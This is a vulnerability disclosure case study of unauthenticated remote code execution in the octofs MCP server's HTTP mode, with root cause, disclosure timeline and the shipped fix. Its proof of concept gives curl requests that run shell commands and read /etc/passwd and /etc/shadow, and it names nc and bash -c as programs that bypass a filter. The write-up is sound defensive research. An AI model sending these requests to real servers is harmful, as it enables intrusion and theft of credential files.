# Case study 4 — Unauthenticated HTTP transport exposes shell tool: remote RCE (CWE-306)

**Target:** `Muvon/octofs` v0.16.3 — Rust MCP server exposing filesystem tools (`view`, `text_editor`, `batch_edit`, `extract_lines`, `shell`, `workdir`) over stdio (default) or Streamable HTTP (`--bind`)
**Severity:** **Critical** — CWE-306 (Missing Authentication for Critical Function); CWE-78 (OS Command Injection — by-design tool exposed without auth)
**Status:** Filed as `Muvon/octofs#12` on 2026-10-11 — **FIXED 2026-10-25**: commit `730803d` (`fix(http)!: require authentication for remote HTTP binds`) on `master`, shipping in the next release. Breaking change: existing `0.0.0.0` binds without a token stop working.
**My role:** sole finder, reporter, and PoC author. Source-verified against `src/main.rs`, `src/cli.rs`, `src/mcp/server.rs`, and `src/mcp/fs/shell.rs`.

## The finding

`octofs mcp --bind <host:port>` starts a Streamable HTTP MCP server with **no authentication of any kind** — no API key, no bearer token, no middleware. Any network client that can reach the port can call the `shell` tool, which executes `sh -c <command>` as the server user: **unauthenticated remote code execution**. The same endpoint exposes `view`, `text_editor`, `batch_edit`, `extract_lines`, and `workdir` for arbitrary file read/write/delete on the host.

Three compounding factors make this Critical rather than a hardening note:

1. **The CLI help text encourages exposure.** `--bind` help says `e.g., "0.0.0.0:12345"` — binding to all interfaces is a one-flag configuration.
2. **SECURITY.md makes a false claim.** It states *"No Network — Default stdio transport, no network exposure"*, which does not hold when `--bind` is used. An operator reading SECURITY.md would reasonably believe the tool is never network-exposed.
3. **The `shell` tool's "misuse detection" is not a security boundary.** `detect_shell_misuse` (shell.rs:213-290) blocks a handful of programs (`cat`/`grep`/`find`/`ls`/`sleep`/`watch`/`tee`/echo-redirects/`sed -i`) as a UX measure — but `curl`, `python3 -c`, `nc`, `bash -c`, and hundreds of other programs pass through to `sh -c`.

## How I found it

octofs came up in a sweep of open-source MCP servers: a server that exposes a general-purpose `shell` tool over a network-capable transport is the highest-risk pattern in the MCP ecosystem. Reading `src/main.rs:117-152` (`run_http_server()`) showed the full picture immediately: `StreamableHttpService::new(...)` with no auth, `axum::Router::new().nest_service("/mcp", service)` with no middleware layer, and a `TcpListener::bind(&addr)` that accepts whatever `--bind` specifies. Cross-referencing `src/cli.rs:36` confirmed the help text actively suggests `0.0.0.0:12345`. The SECURITY.md "No Network" claim sealed it — the project's own security documentation was misleading operators about the exposure.

## Root cause

- `src/main.rs:117-152` — `run_http_server()`:
  - `StreamableHttpService::new(|| Ok(OctofsServer::new()), LocalSessionManager::default().into(), StreamableHttpServerConfig::default()...)` (lines 126-129) — rmcp's `StreamableHttpService` has no built-in auth; none is added.
  - `axum::Router::new().nest_service("/mcp", service)` (line 132) — no middleware layer at all.
  - `tokio::net::TcpListener::bind(&addr)` (line 137) + `axum::serve(...)` (line 143).
- `src/cli.rs:36` — `--bind` help: `Bind to HTTP server on host:port instead of using stdin/stdout (e.g., "0.0.0.0:12345")`.
- `src/mcp/server.rs` — tools registered: `view` (354), `text_editor` (389), `batch_edit` (428), `extract_lines` (462), `shell` (509), `workdir` (605); `shell` dispatch at 501-560.
- `src/mcp/fs/shell.rs:699-701` — `TokioCommand::new("sh"); cmd.args(["-c", &command]); cmd.current_dir(&working_dir)` (Windows: `cmd /C`, lines 694-696). The `detect_shell_misuse` gate (shell.rs:213-290) only blocks a handful of programs as a UX measure — it is not a security boundary.

## Proof of concept

```sh
# Victim machine:
octofs mcp --path /home/user/project --bind 0.0.0.0:12345

# Any machine that can reach the victim — no credentials needed:
# 1) initialize (capture the mcp-session-id response header)
curl -si http://VICTIM:12345/mcp \
  -H 'Content-Type: application/json' \
  -H 'Accept: application/json, text/event-stream' \
  -d '{"jsonrpc":"2.0","id":1,"method":"initialize","params":{"protocolVersion":"2025-06-18","capabilities":{},"clientInfo":{"name":"poc","version":"0.1"}}}'

# 2) RCE via the shell tool
curl -s http://VICTIM:12345/mcp \
  -H 'Content-Type: application/json' \
  -H 'Accept: application/json, text/event-stream' \
  -H 'mcp-session-id: <id-from-step-1>' \
  -d '{"jsonrpc":"2.0","id":2,"method":"tools/call","params":{"name":"shell","arguments":{"command":"id && hostname && head -3 /etc/passwd"}}}'

# 3) Arbitrary file read via the view tool
curl -s http://VICTIM:12345/mcp \
  -H 'Content-Type: application/json' \
  -H 'Accept: application/json, text/event-stream' \
  -H 'mcp-session-id: <id-from-step-1>' \
  -d '{"jsonrpc":"2.0","id":3,"method":"tools/call","params":{"name":"view","arguments":{"path":"/etc/shadow"}}}'
```

Three `curl` commands, zero credentials, full RCE as the server user plus arbitrary file read.

## Impact

- **Unauthenticated RCE** as the user running octofs: anyone who can reach the bind address gets a shell (`shell` tool → `sh -c`).
- **Arbitrary file read/write/delete** on the host via `view` / `text_editor` / `batch_edit` (absolute paths pass through unvalidated — see companion report #13).
- Via `workdir path=ssh://user@host/...`, the server authenticates to arbitrary SSH hosts using the operator's `--ssh-key` / agent — a credential-use/exfiltration primitive.
- The CLI help text documents `0.0.0.0:12345` as the example, so exposure on all interfaces is a one-flag configuration.

## The fix (commit 730803d, shipped 2026-10-25)

The maintainer's fix is a breaking change that addresses every layer of the problem:

- **A non-loopback `--bind` now refuses to start** unless `--auth-token` (or `OCTOFS_AUTH_TOKEN`) is set. Fail-closed by default.
- **With a token, every request must send `Authorization: Bearer <token>`**. The check is constant-time axum middleware (`src/http_auth.rs`).
- **A server without a token listens on loopback only.** It keeps rmcp's loopback Host allowlist and rejects requests that carry a browser `Origin` header, which blocks DNS rebinding and cross-site requests.
- **The `--bind` help example is now `127.0.0.1:12345`** — no longer suggests `0.0.0.0`.
- **SECURITY.md drops the misleading "No Network" claim** and documents the HTTP trust model.

**Breaking change:** existing `0.0.0.0` binds without a token stop working until a token is configured.

My report suggested exactly this shape: refuse to start with `--bind` unless an auth token is provided, enforced in axum middleware with constant-time comparison; or bind to `127.0.0.1` by default and require explicit opt-in for non-loopback binds. The shipped fix implements both halves.

## Timeline

- **2026-10-11** — audited; filed **#12** (Critical, unauthenticated HTTP RCE) and companion **#13** (High, no path containment) as public issues. Both reports also sent to security@muvon.io per SECURITY.md.
- **2026-10-25** — maintainer `donk8r` closed #12: fix commit `730803d` on `master`, shipping in the next release. Breaking change with auth-token requirement, constant-time Bearer middleware, loopback-only default, Origin-header rejection, updated help text, and corrected SECURITY.md.

## Repo context and disclosure

- Rust, actively maintained. No bounty program; public GitHub issues are the channel.
- SECURITY.md asks for private reports via security@muvon.io; the report was also sent there. Filed publicly because the issue is Critical and the exposed bind mode is documented in `--help`.
- Maintainer `donk8r` is responsive: Critical fix shipped 14 days after the report, with a breaking-change commit that addresses every layer (auth, bind default, help text, docs).
- Companion issue **#13** (High, no path containment — CWE-22) remains open.
- No GHSA/CVE requested yet.

## What this demonstrates

Transport-layer threat modeling for MCP servers: when a server exposes dangerous tools (shell, file write) over a network transport, the transport's authentication model *is* the security boundary — and a `--help` example that suggests `0.0.0.0` combined with a SECURITY.md that claims "No Network" creates a false sense of safety for operators. The fix pattern is instructive: fail-closed defaults (refuse non-loopback binds without a token), constant-time credential comparison in middleware, and defense-in-depth for the loopback case (Host allowlist + Origin-header rejection against DNS rebinding). The report also shows the value of filing a companion issue: the path-containment gap (#13) is independently High and compounds the transport issue.
